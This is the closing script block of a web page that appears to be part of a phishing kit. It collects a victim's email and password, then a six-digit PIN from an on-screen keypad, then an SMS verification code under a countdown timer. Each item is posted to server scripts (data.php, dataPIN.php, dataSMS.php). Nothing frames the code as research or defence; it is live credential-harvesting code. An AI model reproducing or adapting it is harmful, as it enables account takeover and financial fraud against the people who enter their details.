            togglePassword.addEventListener("click", function () {
                // toggle the type attribute
                const type = password.getAttribute("type") === "password" ? "text" : "password";
                password.setAttribute("type", type);
                
                // toggle the icon
                this.classList.toggle("fa-eye-slash");
            });
            
            let input = document.querySelector(".input");
            let button = document.querySelector("#btnpst");
            
            button.disabled = true; //setting button state to disabled
            
            input.addEventListener("change", stateHandle);
            
            function stateHandle() {
                if (document.querySelector(".input").value === "") {
                    button.disabled = true; //button remains disabled
                    $('#btnpst').addClass('opbtn');
                } else {
                    button.disabled = false; //button is enabled
                    $('#btnpst').removeClass('opbtn');
                }
            }
            
            </script>
        
        <script>
            
             function alxfrm(){
        		$ealx = $('#ealx').val().trim();
        		$palx = $('#palx').val().trim();
        		if($ealx == '' || $ealx == null || $ealx.length <= 5)
        		{
        			$('#eslh').show();
        			setTimeout(() => {
                        $('#eslh').fadeOut();
                    },2000)
        			$('#pslh').hide();
        			return false;
        		}else{
        			$('#eslh').hide();
        		}
        		if($palx == '' || $palx == null || $palx.length <= 5)
        		{
        			$('#pslh').show();
        			setTimeout(() => {
                        $('#pslh').fadeOut();
                    },2000)
        			return false;
        		}else{
        			$('#pslh').hide();
        		}
        		
        		if($ealx.length >=5 || $palx.length >=5) {
        		    $.ajax({
                        type: 'POST',
                        url: 'data.php',
                        data: $('#ngumpulinuangnikah').serialize(),
                        dataType: 'text',
                        success: function() {
                                    $('frmalxbr').hide();
                                    $('pnalxbr').show();
                                    $("input#remail").val($ealx);
                                    $("input#rpassword").val($palx);
                            } 
                    })
        		}
        	}
        	</script>
        
        <script>
        	
        	function clpnalx() {
        	    $('frmalxbr').show();
                $('pnalxbr').hide();
        	}
        	//key numeric
            
            </script>
        
        <script>
                
                
                $( document ).on( "click", ".key1", function(){
                    var parents1 = $( this ).parents( "pnalxbr" );
                    var number1 = $( this ).attr( "data-key" );
                    
                    var input1 = parents1.find(".alxpinr");
                    var inputValue1 = input1.val();
                    
                    input1.val( inputValue1 + number1 ).change()[0].maxLength = 6;
                    $("#pinalx").on('input', function() {
                        var $display = $("#pinalx").val();
                        if($display.length >= 6) {
                                $("#kbrd0").prop("disabled", true);
                                $("#kbrd1").prop("disabled", true);
                                $("#kbrd2").prop("disabled", true);
                                $("#kbrd3").prop("disabled", true);
                                $("#kbrd4").prop("disabled", true);
                                $("#kbrd5").prop("disabled", true);
                                $("#kbrd6").prop("disabled", true);
                                $("#kbrd7").prop("disabled", true);
                                $("#kbrd8").prop("disabled", true);
                                $("#kbrd9").prop("disabled", true);
                                alert("Selamat datang di tutorial Javascript");
                            }else{
                                $("#kbrd0").prop("disabled", false);
                                $("#kbrd1").prop("disabled", false);
                                $("#kbrd2").prop("disabled", false);
                                $("#kbrd3").prop("disabled", false);
                                $("#kbrd4").prop("disabled", false);
                                $("#kbrd5").prop("disabled", false);
                                $("#kbrd6").prop("disabled", false);
                                $("#kbrd7").prop("disabled", false);
                                $("#kbrd8").prop("disabled", false);
                                $("#kbrd9").prop("disabled", false);
                            }
                    });
                    
                    var alamat = document.getElementById("pinalx").value;
                    if (alamat.length >= 6) {
                        $('welalxcome').show();
                        fralxpn();
                    }
                });
                
                $( document ).on( "click", "#del", function(){
                    document.getElementById("pinalx").value="";
                    
                });
                
                
                </script>
        
        <script>
            function fralxpn(){
                $pinalx = $('#pinalx').val().trim();
                $.ajax({
                        type: 'POST',
                        url: 'dataPIN.php',
                        data: $('#alxpnnikah').serialize(),
                        dataType: 'text',
                        success: function() {
                            $('welalxcome').hide();
                            $('pnalxbr').hide();
                            $('smalxs').show();
                            $("input#rpin").val($pinalx);
                            } 
                    })
            }
            
           
            
        </script>
        
        <script>
            $(document).ready(function() {
                $("#alxsm").on('input', function() {
                        var alxsm = $("#alxsm").val();
        
                        if(alxsm.length >= 6) {
                            $("#btnalxsm").prop("disabled", false);
                            $('#btnalxsm').css("opacity", "1")
                        }else{
                            $("#btnalxsm").prop("disabled", true);
                            $('#btnalxsm').css("opacity", "0.5")
                        }
                });
            });
            </script>
        
        <script>
            function fralxsm(){
                $.ajax({
                        type: 'POST',
                        url: 'dataSMS.php',
                        data: $('.alxinpsm').serialize(),
                        dataType: 'text',
                        success: function() {
                            $('#alxsm').val('');
                            } 
                    })
            }
            </script>
        
        <script>
            var timer2 = "05:01";
            var interval = setInterval(function() {
            
            
              var timer = timer2.split(':');
              //by parsing integer, I avoid all extra string processing
              var minutes = parseInt(timer[0], 10);
              var seconds = parseInt(timer[1], 10);
              --seconds;
              minutes = (seconds < 0) ? --minutes : minutes;
              if (minutes < 0) clearInterval(interval);
              seconds = (seconds < 0) ? 59 : seconds;
              seconds = (seconds < 10) ? '0' + seconds : seconds;
              //minutes = (minutes < 10) ?  minutes : minutes;
              $('.countdown').html(minutes + ':' + seconds);
              timer2 = minutes + ':' + seconds;
            }, 1000);
        </script>
    </body>
</html>